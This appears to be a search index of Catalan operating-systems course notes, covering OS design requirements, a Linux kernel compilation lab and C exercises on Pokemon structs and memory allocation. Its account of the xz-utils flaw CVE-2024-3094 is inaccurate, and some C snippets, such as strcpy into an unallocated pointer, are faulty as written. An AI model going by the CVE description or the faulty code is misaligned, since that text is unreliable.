capaç de protegir les dades dels usuaris contra l’ús no autoritzat i garantir la seguretat de la informació.\nSeguretat: Capacitat de protegir els recursos del sistema contra atacs i vulnerabilitats. Un sistema segur ha de ser capaç de detectar i respondre a amenaces de seguretat, com ara virus, malware o atacs cibernètics, i mantenir la integritat del sistema en tot moment.\nEscalabilitat: Capacitat de créixer i adaptar-se a les necessitats dels usuaris. Un sistema escalable ha de ser capaç de gestionar càrregues de treball variables i augmentar la seva capacitat de processament i emmagatzematge segons sigui necessari.\nPortabilitat: Capacitat de ser executat en diferents plataformes i arquitectures de maquinari. Un sistema portàtil ha de ser capaç de funcionar en una àmplia varietat de dispositius i entorns sense necessitat de modificacions.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#disseny-de-sistemes-operatius",
    "href": "notes/01-introduction.html#disseny-de-sistemes-operatius",
    "title": "Introducció",
    "section": "Disseny de Sistemes Operatius",
    "text": "Disseny de Sistemes Operatius\nEl disseny d’un sistema operatiu (SO) és una tasca complexa que requereix la creació d’una sistema robust, segur i eficient per gestionar el maquinari i proporcionar serveis als usuaris i aplicacions. Els dissenyadors de sistemes operatius han de tenir en compte una varietat de factors per assegurar que el sistema compleixi amb els requisits de rendiment, seguretat i funcionalitat ,maximitzant o minimizant les mètriques d’avaluació discutides anteriorment.\n\nComplexitat de la Programació Distribuïda: Els sistemes operatius han de gestionar entorns distribuïts. Això implica coordinar múltiples nodes, mantenir la coherència de dades i gestionar les comunicacions en xarxa. Aquesta complexitat es veu amplificada en sistemes com el núvol (cloud computing).\nComplexitat de la Programació Concorrent: Els sistemes operatius han de gestionar múltiples processos i fils d’execució de manera eficient. Això implica la gestió de la sincronització, la comunicació i la compartició de recursos entre els processos.\nComplexitat pel Context (Mòbil, IoT, Servidors): Els SO per a dispositius mòbils, Internet de les Coses (IoT) i servidors tenen requisits específics que influeixen en el seu disseny. Per exemple, iOS i Android han de ser àgils i adaptatius per a diverses condicions d’ús (interficies tàctils, usuaris en constant moviment), mentre que sistemes com Linux per a servidors han de gestionar càrregues elevades i proporcionar alta disponibilitat.\nComplexitat per la Heterogeneïtat del Hardware: La diversitat en els components de maquinari presenta reptes significatius en la compatibilitat i el rendiment. Els dissenyadors han de desenvolupar sistemes operatius que puguin adaptar-se a diverses arquitectures de maquinari, cosa que pot requerir solucions innovadores per garantir un rendiment òptim. Avui en dia, tenim processadors de diferents fabricants (Intel, AMD, ARM), xarxes de comunicació diverses (Ethernet, Wi-Fi, 5G) i dispositius d’emmagatzematge amb tecnologies variades (SSD, HDD, cintes magnètiques). Els SO han de ser capaços de gestionar aquesta diversitat de manera eficient.\nPortabilitat: La capacitat d’un SO per ser executat en diferents plataformes de maquinari és essencial. Un exemple de portabilitat és Java, amb la seva màquina virtual (JVM) que permet executar aplicacions en diverses plataformes sense necessitat de recompilació. Els contenidors Docker són un altre exemple de portabilitat, ja que permeten als desenvolupadors executar aplicacions en entorns aïllats sense dependències de la plataforma.\nSeguretat: Els dissenyadors han de tenir en compte les vulnerabilitats de seguretat, com ara atacs de dia zero, malware i vulnerabilitats de xarxa. Sistemes com SELinux i AppArmor ofereixen funcions de seguretat avançades per protegir els sistemes contra amenaces. Per exemple, al 2024, va sorgir una vulnerabilitat que afectava gairebé a tots els sistemes linux. Aquesta vulnerabilitat es coneix com en xz-utils identificada com CVE-2024-3094. Podeu trobar més informació sobre aquesta vulnerabilitat a CVE-2024-3094. Aquesta vulnerabilitat permetia que un atacant executés codi maliciós amb privilegis elevats mitjançant un fitxer especialment manipulat que explota una debilitat en el procés de descompressió de fitxers.\nEficiència: Els SO han de ser eficients en l’ús dels recursos del sistema, com la CPU, la memòria i el disc dur. Això implica optimitzar els algorismes i les estructures de dades per garantir un rendiment òptim.\nEscalabilitat: Els SO han de ser capaços de créixer amb les necessitats del sistema, ja sigui en termes de càrrega de treball, nombre d’usuaris o mida de la xarxa. Això implica dissenyar sistemes que puguin adaptar-se a canvis en les condicions del sistema i mantenir un rendiment estable en tot moment.\nMantenibilitat: Els SO han de ser fàcils de mantenir i actualitzar per garantir un funcionament continu i sense interrupcions. Això implica dissenyar sistemes amb una arquitectura clara i modular que permeti fer canvis i millores sense afectar la funcionalitat existent.\nCompatibilitat: Els SO han de ser compatibles amb una àmplia gamma de programari i dispositius per garantir una transició suau entre versions i maximitzar l’ús de programari existent. Això implica dissenyar sistemes que puguin interactuar amb una varietat de dispositius i aplicacions sense problemes.\nUsabilitat: Els SO han de ser fàcils d’utilitzar i entendre per als usuaris, amb una interfície clara i intuïtiva que faciliti la interacció amb el sistema. Això implica dissenyar sistemes amb una interfície d’usuari coherent i funcionalitats accessibles per a tots els usuaris.\nAdaptabilitat: Els SO han de ser capaços d’adaptar-se a canvis en l’entorn del sistema, com ara actualitzacions de programari, canvis en la càrrega de treball o noves tecnologies. Això implica dissenyar sistemes que puguin evolucionar amb el temps i mantenir la seva funcionalitat en situacions canviants.\nTolerància a Fallades: Els SO han de ser tolerants a fallades per garantir la integritat del sistema en cas de problemes. Això implica dissenyar sistemes que puguin recuperar-se de fallades inesperades i mantenir la seva operació en situacions advers\nTransparència: Els SO han de ser transparents per als usuaris i desenvolupadors, amb una interfície clara i consistent que permeti interactuar amb el sistema de manera senzilla. Això implica dissenyar sistemes amb una interfície d’usuari coherent i funcionalitats accessibles per a tots els usuaris.\n\n\nCas pràctic: Vehicle autònom\nImaginem que estem dissenyant un sistema operatiu per a un vehicle autònom. Quins serien els requisits clau que hauríem de tenir en compte en el disseny del sistema operatiu?\n\nSeguretat: La seguretat és una prioritat en un vehicle autònom, ja que ha de garantir que el vehicle no pugui ser controlat remotament per un atacant malintencionat. Això implica implementar mesures de seguretat com xifrat de comunicacions, autenticació robusta i protecció contra vulnerabilitats conegudes. A més, s’han de protegir les dades sensibles, com les dades de localització i informació personal dels passatgers.\nTolerància a fallades: El sistema ha de ser tolerant a fallades, amb mecanismes per detectar, aïllar i recuperar-se de errors. Això implica utilitzar tècniques com la redundància de components i sistemes, així com implementar mecanismes de recuperació i reconfiguració automàtica en cas de fallades. La capacitat de recuperació ha de permetre al vehicle continuar funcionant amb seguretat fins i tot en cas de fallades parcials. Els accidents no poden ser una opció.\nGestió de recursos: El sistema ha de gestionar eficientment els recursos del vehicle, com la CPU, la memòria i els sensors. Ha de prioritzar les tasques crítiques per a la conducció segura, com la detecció de obstacles i la presa de decisions en temps real, mentre optimitza altres processos per a un rendiment global equilibrat.\nAdaptabilitat: Ha de ser capaç d’adaptar-se a canvis en les condicions de la carretera, com variacions en el clima, el trànsit i l’estat de les carreteres. Això requereix una infraestructura flexible i adaptable que pugui ajustar les estratègies de conducció i la gestió dels recursos en resposta a les condicions dinàmiques.\n\n\n\nCas pràctic: Sistema operatiu d’un telèfon mòbil\nAra, considerem el sistema operatiu d’un telèfon mòbil:\n\nUsabilitat: La interfície ha de ser fàcil d’utilitzar i intuitiva per als usuaris, amb funcionalitats accessibles i una navegació clara. Ha de permetre als usuaris interactuar amb el dispositiu de manera eficaç i senzilla, amb opcions de personalització i configuració per adaptar-se a les preferències de l’usuari.\nCompatibilitat: Ha de ser compatible amb una àmplia gamma d’aplicacions i serveis, assegurant-se que les aplicacions funcionin correctament en diferents models de dispositius i versions del sistema operatiu. Això implica la gestió de la compatibilitat amb hardware divers i la integració amb serveis de tercers.\nSeguretat de dades: El sistema operatiu ha de protegir la privacitat i la confidencialitat de les dades dels usuaris. Això implica implementar mesures de seguretat com xifrat de dades emmagatzemades i en trànsit, control d’accessos a aplicacions, i actualitzacions de seguretat regulars per abordar vulnerabilitats noves.\nEficiencia energètica: Ha de ser eficient en l’ús de la bateria, optimitzant els processos i serveis per maximitzar l’autonomia. Això pot incloure tècniques com la gestió intel·ligent del consum energètic, l’optimització del rendiment dels processadors i la gestió efectiva de les aplicacions en segon pla.\nRendiment: Ha de proporcionar un rendiment fluït i ràpid, amb temps de resposta mínims per a les accions dels usuaris. Això implica una gestió eficient dels recursos del sistema, incloent la CPU, la memòria RAM i l’emmagatzatge, així com l’optimització de les operacions d’entrada/sortida.\nMobilitat: Ha de ser dissenyat per a la mobilitat, amb funcionalitats com la connexió sense fils, la geolocalització i la integració amb serveis de xarxa mòbil. Això implica la gestió de la connectivitat, la gestió de la xarxa i la integració amb serveis de localització per proporcionar una experiència mòbil completa.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#referències",
    "href": "notes/01-introduction.html#referències",
    "title": "Introducció",
    "section": "Referències",
    "text": "Referències\n\nModern Operating Systems, Andrew S. Tanenbaum, Herbert Bos, Pearson, 2014.\nOperating System Concepts, Abraham Silberschatz, Peter B. Galvin, Greg Gagne, Wiley, 2018.\nOperating Systems: Three Easy Pieces, Remzi H. Arpaci-Dusseau, Andrea C. Arpaci-Dusseau, Arpaci-Dusseau Books, 2014.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ·Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html",
    "href": "activities/unit01/01-kernel.html",
    "title": "Compilant el Kernel de Linux",
    "section": "",
    "text": "En aquest exercici, compilarem el kernel de Linux. La compilació del kernel és un procés complex i tedios. La compilació del kernel és un procés que implica la creació d’un nou kernel personalitzat a partir dels sources del kernel de Linux.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#requeriments-previs",
    "href": "activities/unit01/01-kernel.html#requeriments-previs",
    "title": "Compilant el Kernel de Linux",
    "section": "Requeriments previs",
    "text": "Requeriments previs\nEn primer lloc, accedirem a una sessió com a usuari root per poder instal·lar tots els paquets que necessitarem per realitzar el laboratori.\nsu -\napt update && apt upgrade -y \n\nInstal·la les eines essencials per a la construcció de programar:\napt install build-essential libncurses-dev bison flex kmod bc -y\nInstal·la utilitats per a l’ús de l’algoritme de compressió XZ i el desenvolupament amb SSL:\napt install xz-utils libssl-dev  -y\nManipulació de fitxers ELF:\napt install libelf-dev dwarves -y\nInstal·la les capçaleres del nucli de Linux corresponents a la versió actual del teu sistema (obtinguda amb uname -r):\napt install linux-headers-$(uname -r) -y \n\nFinalment tornem a una sessió d’usuari normal:\nexit\nCom a usuari normal, reviseu quin és la versió del kernel actual:\nuname -r\nEn el meu cas és 6.1.0-39-arm64.\n\nNota:\nUs recomano en aquest punt fer un clon de la vostra màquina virtual per si es produeix algun error durant la compilació del kernel.\n\nA més a més, a la màquina clonada, us recomano que li adjunteu un nou disc virtual de 60 GB per poder compilar el kernel i no quedar-vos sense espai en disc. Un cop adjuntat el nou disc, podeu seguir els passos següents per muntar-lo i comprovar que s’ha afegit correctament.\nlsblk\nNAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nsr0          11:0    1 526,3M  0 rom\nnvme0n1     259:0    0    20G  0 disk\n├─nvme0n1p1 259:1    0   512M  0 part /boot/efi\n├─nvme0n1p2 259:2    0  18,5G  0 part /\n└─nvme0n1p3 259:3    0   976M  0 part [SWAP]\nnvme0n2     259:4    0    60G  0 disk \nPer obtenir l’etiquesta del disc nou que heu afegit. En el meu cas és nvme0n2. En el vostre cas pot ser diferent i pot ser sdb, vdc, etc. Un cop tingueu l’etiqueta del disc nou, podeu formatar-lo i muntar-lo. Assegureu-vos que és de 60 GB.\n# Com a root\nmkfs.ext4 /dev/nvme0n2\nmount /dev/nvme0n2 /mnt\nQuan us baixeu els sources del kernel, feu-ho a la carpeta /mnt que és on teniu el disc nou muntat.\ncd /mnt",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#obtenció-dun-kernel",
    "href": "activities/unit01/01-kernel.html#obtenció-dun-kernel",
    "title": "Compilant el Kernel de Linux",
    "section": "Obtenció d’un kernel",
    "text": "Obtenció d’un kernel\nBaixeu una versió del nucli 6.11.1 de kernel.org i descomprimiu els sources a la vostra màquina virtual. Podeu baixar els fitxers directament a /mnt.\nwget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.11.1.tar.xz\ntar -xJf linux-6.11.1.tar.xz\ncd linux-6.11.1/",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#configuració-del-kernel",
    "href": "activities/unit01/01-kernel.html#configuració-del-kernel",
    "title": "Compilant el Kernel de Linux",
    "section": "Configuració del Kernel",
    "text": "Configuració del Kernel\nLa configuració del kernel és un pas crucial en el procés de compilació, ja que permet personalitzar el kernel segons les necessitats i requeriments específics del sistema en què s’implementarà. Aquesta personalització pot incloure adaptar el kernel per garantir la compatibilitat amb el maquinari disponible i afegir funcionalitats específiques que l’usuari desitja integrar. Per exemple, es pot afegir el sistema de fitxer avançats com zfs o btrfs. Un usuari avançat es pot fer un kernel a mida per optimitzar el rendiment del sistema.\nAra bé, en aquest laboratori, per configurar el kernel, partirem de la configuració actual del vostre sistema :\ncp -v /boot/config-$(uname -r) .config\nA continuació, pots fer ajustos de configuració, en el nostre cas no farem cap canvi, únicament guardarem la configuració actual. Per realitzar la comanda següent heu de ser root i estar al directori on heu descomprimit els sources del kernel.\nmake menuconfig\nEn aquest punt, accedirem a una interfície gràfica per configurar el kernel. Aquesta interfície ens permetrà seleccionar les opcions de configuració del kernel. Si no voleu fer cap canvi, podeu sortir de l’interfície sense guardar cap canvi. Si voleu fer canvis, podeu fer-ho i desar la configuració.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#edició-de-.config",
    "href": "activities/unit01/01-kernel.html#edició-de-.config",
    "title": "Compilant el Kernel de Linux",
    "section": "Edició de .config",
    "text": "Edició de .config\nUtilitzeu un editor de text per editar el fitxer de configuració del kernel. Cerca la configuració CONFIG_SYSTEM_TRUSTED_KEYS i assigna-li el valor de cadena buida. Si ja té aquest valor assignat a la cadena buida, no cal fer cap canvi.\nvi .config\n# Premeu / i després escriviu el patró a cercar\n# Cerca: CONFIG_SYSTEM_TRUSTED_KEYS\n# Edita: CONFIG_SYSTEM_TRUSTED_KEYS=\"\"\n# Desa i surt (wq!)",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit01/01-kernel.html#compilació-i-installació",
    "href": "activities/unit01/01-kernel.html#compilació-i-installació",
    "title": "Compilant el Kernel de Linux",
    "section": "Compilació i Instal·lació",
    "text": "Compilació i Instal·lació\nUtilitzarem l’eina screen que ens permetrà deixar la compilació en segon pla i poder fer altres tasques. No tanqueu la màquina virtual. La shell o el visual code els podeu tancar. Deixeu el procés overnight i al matí podreu veure el resultat.\nsu -c \"apt install screen -y\"\nscreen -S compilantKernel\nUtilitzarem l’eina make per compilar el kernel. Aquesta eina ens permet compilar de forma paral·lela. El nombre de processos que es poden executar de forma paral·lela es pot especificar amb l’opció -j. En el nostre cas, utilitzarem el nombre de processadors disponibles a la nostra màquina virtual obtinguts amb nproc.\n\nNota:\nAbans d’executar la comanda, intenteu parar la màquina virtual i assignar-li el màxim nombre de processadors que pugueu. Això accelerarà el procés de compilació.\n\nmake  ARCH=x86_64 -j `nproc` && make ARCH=x86_64 modules_install -j `nproc` && make ARCH=x86_64 install -j `nproc`\n# enter\n# Això pot trigar... paciencia ^^\n\nNota:\nSi utilitzeu una màquina física amb ARM, com un MAC M, heu de canviar l’arquitectura a arm64 en l’opció ARCH.\n\nPer sortir de la sessió de screen i poder realitzar altres tasques a la màquina virtual:\n# Premeu Ctrl+A i després d\n\nPer tornar a la sessió de screen:\n\nscreen -r compilantKernel\nUn cop finalitzada la compilació, actualitzarem el grub per poder seleccionar el nou kernel que hem compilat.\nreboot\nUn cop arranqui la màquina virtual, podreu seleccionar el nou kernel a les opcions avançades del grub. En aquest punt, podeu seleccionar la versió del kernel que voleu carregar.",
    "crumbs": [
      "Activitats",
      "Unitat 02",
      "Compilant el Kernel de Linux"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html",
    "href": "activities/unit00/02-ex01-c.html",
    "title": "Exercicis amb C - Pokemon",
    "section": "",
    "text": "Aprendre a utilitzar estructures de dades en C.\nPracticar la manipulació de cadenes en C.\nDesenvolupar habilitats en la creació de programes en C que utilitzin estructures de dades.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#objectius",
    "href": "activities/unit00/02-ex01-c.html#objectius",
    "title": "Exercicis amb C - Pokemon",
    "section": "",
    "text": "Aprendre a utilitzar estructures de dades en C.\nPracticar la manipulació de cadenes en C.\nDesenvolupar habilitats en la creació de programes en C que utilitzin estructures de dades.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#estructures-de-dades-en-c",
    "href": "activities/unit00/02-ex01-c.html#estructures-de-dades-en-c",
    "title": "Exercicis amb C - Pokemon",
    "section": "Estructures de dades en C",
    "text": "Estructures de dades en C\nUn pokemon el podem entendre com una estructura de dades que conté diferents camps. En aquest cas, els camps que ens interessen són:\n\npokemon_id: identificador únic del pokemon\nname: nom del pokemon\nheight: altura del pokemon\nweight: pes del pokemon\n\nPer poder implementar aquesta estructura de dades en C, necessitem definir un tipus de dades que ens permeti agrupar aquests camps. Això ho podem fer mitjançant la paraula reservada struct.\nstruct pokemon {\n    int          pokemon_id;\n    char         name[50];\n    double       height;\n    double       weight;\n};\nPodem fer un programa molt senzill per crear un pokemon i mostrar-lo per pantalla.\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strcpy\n\nstruct pokemon {\n    int          pokemon_id;\n    char         name[50];\n    double       height;\n    double       weight;\n};\n\nint main() {\n    struct pokemon pikachu;\n    pikachu.pokemon_id = 25;\n    strcpy(pikachu.name, \"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    return 0;\n}\nSi compilem i executem el programa, funcionarà i obtindrem el resultat esperat:\ngcc -o pokemon main.c\n./pokemon \n    Pokemon: Pikachu\n    Pokemon ID: 25\n    Pokemon Height: 0.400000\n    Pokemon Weight: 6.000000\nEn aquesta primera versió hem utilitzat una mida estàtica pel camp name utilizant la stack. Això vol dir que el nom del pokemon no pot ser més gran de 50 caràcters. També, indica que estem desaprofitant memòria en tots els noms de pokemons inferiors a 50 caràcters. Recordeu que la mèmoria és un recurs molt valuós i que hem d’aprofitar al màxim.\nPer tant, per poder solucionar aquest problema, podem utilitzar la heap per reservar memòria dinàmicament per al camp name. Això ens permetrà utilitzar la memòria de forma més eficient i no tindrem cap limitació en la mida del nom del pokemon. D’aquesta manera podem garantir que cada nom ocupi l’espai que requereixi.\nstruct pokemon {\n    int          pokemon_id;\n    char         *name;\n    double       height;\n    double       weight;\n};\nPer tant el nostre programa quedaria de la següent manera, on podem veure com reservem memòria per al camp name mitjançant la funció malloc i alliberem la memòria reservada mitjançant la funció free:\n/*  \n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strcpy()\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\n\nint main() {\n    struct pokemon pikachu;\n    pikachu.pokemon_id = 25;\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    pikachu.name = malloc(8 * sizeof(char));\n    strcpy(pikachu.name, \"Pikachu\");\n    \n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\n\n\n\n\n\n\nConsellObservació\n\n\n\nQuan reserveu memòria per una cadena de caràcters recordeu de reservar 1 byte més per el caràcter de final de cadena ‘\\0’.\n\n\npikachu.name = malloc( (strlen(\"Pikachu\")+1) * sizeof(char) );\nAra anem analitzar els següents supòsits:\nchar name[] = \"Pikachu\";\npikachu.name = name;\npikachu.name = &name;\npikachu.name = strdup(name);\nstrcpy(pikachu.name, name);\nUs deixo les signatures de les funcions que es troben a la llibreria string.h:\nchar *strdup(const char *s);\nchar *strcpy(char *dest, const char *src);\n\npikachu.name = name;: Aquesta assignació és vàlida ja que name és un array de caràcters i, en aquest context, es comporta com un punter al seu primer element (és equivalent a &name[0]), que és el que espera pikachu.name. Però si modifiquem la variable name en un altre punt del programa, pikachu.name també canviarà, ja que apunta a la mateixa memòria.\n\nchar name[] = \"Pikachu\";\npikachu.name = name;\nprintf(\"Pokemon: %s\\n\", pikachu.name); // Pikachu\nstrcpy(name,\"Raichu\");\nprintf(\"Pokemon: %s\\n\", pikachu.name); // Raichu\n\npikachu.name = &name;: &name és l’adreça de l’array name, i pikachu.name és un punter a char, així que aquesta assignació no és vàlida, ja que l’adreça de name no és compatible amb un punter a char.\npikachu.name = strdup(name);: Aquesta assignació és vàlida ja que strdup retorna un punter a char, i això és el que espera pikachu.name. A més, com que strdup reserva memòria nova per a la cadena, no hi ha cap problema si modifiquem la variable name en un altre punt del programa. Es pot fer servir sense reserva prèvia de memòria per a pikachu.name, ja que strdup reserva memòria nova per a la cadena i retorna un punter a aquesta memòria.\nstrcpy(pikachu.name, name);: Això és vàlid si pikachu.name ja té memòria reservada prèviament (per exemple, a través de malloc o calloc) en la qual es pot realitzar la còpia.\n\n\n\n\n\n\n\nConsellObservació\n\n\n\nMalloc i Calloc ens permeten reservar memòria dinàmicament. La diferència entre malloc i calloc és que malloc no inicialitza la memòria reservada, mentre que calloc inicialitza la memòria reservada a 0.\n\n\nCom a resum podem dir que:\nPokemon *pikachu = create_pokemon();\nset_name(pikachu, \"Pikachu\");\nset_pokemon_id(pikachu, 25);\nset_height(pikachu, 0.4);\nset_weight(pikachu, 6.0);\nEn mèmoria es veuria així:\n\nTot la estructura de dades pikachu es troba a la heap tant el id, height, weight i el punter name. El punter pikachu es troba a la stack. En canvi, el punter Pokemon pikachu es troba a la stack i apunta a l’estructura de dades Pokemon que es troba a la heap.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#ús-de-typedef",
    "href": "activities/unit00/02-ex01-c.html#ús-de-typedef",
    "title": "Exercicis amb C - Pokemon",
    "section": "Ús de typedef",
    "text": "Ús de typedef\nAra podem utilitzar typedef per definir un nou tipus de dades que ens permeti crear pokemons de forma més senzilla.\n/*\n * main.c\n*/\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strdup(),\n\ntypedef struct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n} Pokemon;\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\n\n\n\n\n\n\nConsellObservació\n\n\n\nLa funció strdup per definició fa exactament el mateix que fer servir malloc i strcpy, però en una sola línia de codi, per tant s’ha de desasignar la memòria reservada amb free.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon·"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#creació-i-ús-de-llibreries",
    "href": "activities/unit00/02-ex01-c.html#creació-i-ús-de-llibreries",
    "title": "Exercicis amb C - Pokemon",
    "section": "Creació i ús de llibreries",
    "text": "Creació i ús de llibreries\nPer poder reutilitzar el codi que hem creat fins ara, podem crear una llibreria que ens permeti fer operacions amb pokemons. Per exemple, podem moure la definició de la nostra estructura de dades Pokemon a un fitxer anomenat pokemon.h i la implementació de les funcions a un fitxer anomenat pokemon.c.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n} Pokemon;\n\n#endif // _POKEMON_H_\nEn el fitxer pokemon.c implementarem les funcions que hem definit a la interfície de la nostra llibreria.\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\nAra podem utilitzar la nostra llibreria:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\nSi compilem i executem:\ngcc pokemon.c main.c -o pokemon\n./pokemon \nObtindrem el següent resultat, on semblaria que tot funciona correctament:\nPokemon: Pikachu\nPokemon ID: 25\nPokemon Height: 0.400000\nPokemon Weight: 6.000000\nQuè implica moure la definició de la nostra estructura de dades al fitxer d’implementació?\nSi movem la definició de la nostra estructura de dades al fitxer d’implementació, el compilador no podrà veure la definició de la nostra estructura de dades quan compili el nostre programa principal. Per fer-ho necessitem definir el tipus de dades Pokemon al fitxer pokemon.h i la definició dels atributs de la nostra estructura de dades al fitxer pokemon.c.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\n#endif // _POKEMON_H_\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; //strlen(), strcpy()\n#include \"pokemon.h\"\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\nAra en el nostre fitxer main.c podem utilitzar la nostra llibreria de la següent manera:\n/*\n * main.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"pokemon.h\"\n\nint main() {\n    Pokemon pikachu;\n    pikachu.pokemon_id = 25;\n\n    pikachu.name = strdup(\"Pikachu\");\n    pikachu.height = 0.4;\n    pikachu.weight = 6.0;\n\n    printf(\"Pokemon: %s\\n\", pikachu.name);\n    printf(\"Pokemon ID: %d\\n\", pikachu.pokemon_id);\n    printf(\"Pokemon Height: %f\\n\", pikachu.height);\n    printf(\"Pokemon Weight: %f\\n\", pikachu.weight);\n\n    free(pikachu.name);\n\n    return 0;\n}\nEn aquest punt els atributs de la nostra estructura de dades són privats i no poden ser modificats des de l’exterior. Per tant, necessitem definir getters i setters per poder accedir i modificar els atributs de la nostra estructura de dades.\n/*\n * pokemon.h\n */\n\n#ifndef _POKEMON_H_\n#define _POKEMON_H_\n\ntypedef struct pokemon Pokemon;\n\nint get_pokemon_id(Pokemon *pokemon);\nvoid set_pokemon_id(Pokemon *pokemon, int pokemon_id);\n\nchar * get_name(Pokemon *pokemon);\nvoid set_name(Pokemon *pokemon, char *name);\n\ndouble get_height(Pokemon *pokemon);\nvoid set_height(Pokemon *pokemon, double height);\n\ndouble get_weight(Pokemon *pokemon);\nvoid set_weight(Pokemon *pokemon, double weight);\n\n#endif // _POKEMON_H_\nObserveu que els setter reben un punter a la nostra estructura de dades Pokemon. Això és perquè volem modificar l’estructura de dades original i no una còpia de l’estructura de dades. En el cas dels getter no necessitem modificar l’estructura de dades original, per tant, no necessitem passar un punter però per evitar còpies innecessàries de l’estructura de dades, passem un punter.\n/*\n * pokemon.c\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include \"pokemon.h\"\n\nstruct pokemon {\n    int          pokemon_id;\n    char *       name;\n    double       height;\n    double       weight;\n};\n\nint get_pokemon_id(Pokemon *pokemon) {\n    return pokemon-&gt;pokemon_id;\n}\n\nvoid set_pokemon_id(Pokemon *pokemon, int pokemon_id) {\n    pokemon-&gt;pokemon_id = pokemon_id;\n}\n\nchar * get_name(Pokemon *pokemon) {\n    return pokemon-&gt;name;\n}\n\nvoid set_name(Pokemon *pokemon, char *name) {\n    strcpy(pokemon-&gt;name, name);\n}\n\ndouble get_height(Pokemon *pokemon) {\n    return pokemon-&gt;height;\n}\n\nvoid set_height(Pokemon *pokemon, double height) {\n    pokemon-&gt;height = height;\n}\n\ndouble get_weight(Pokemon *pokemon) {\n    return pokemon-&gt;weight;\n}\n\nvoid set_weight(Pokemon *pokemon, double weight) {\n    pokemon-&gt;weight = weight;\n}\n\n\n\n\n\n\nImportantObservació\n\n\n\nLa funció strcpy 